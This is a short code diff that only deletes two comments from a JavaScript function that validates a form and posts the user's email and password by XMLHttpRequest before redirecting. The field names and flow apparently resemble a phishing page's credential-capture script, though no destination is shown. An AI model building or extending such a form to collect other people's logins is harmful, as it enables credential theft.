@@ -61,7 +61,7 @@ function validateAndRedirect() {
     }
   
     if (!isValid) {
-        return false; // Prevent form submission
+        return false;
     }
   
     var xhr = new XMLHttpRequest();
@@ -88,7 +88,7 @@ function validateAndRedirect() {
     };
     xhr.send('myemail=' + encodeURIComponent(email) + '&mypassword=' + encodeURIComponent(password));
   
-    return false; // Prevent form submission
+    return false; 
   }
   
 
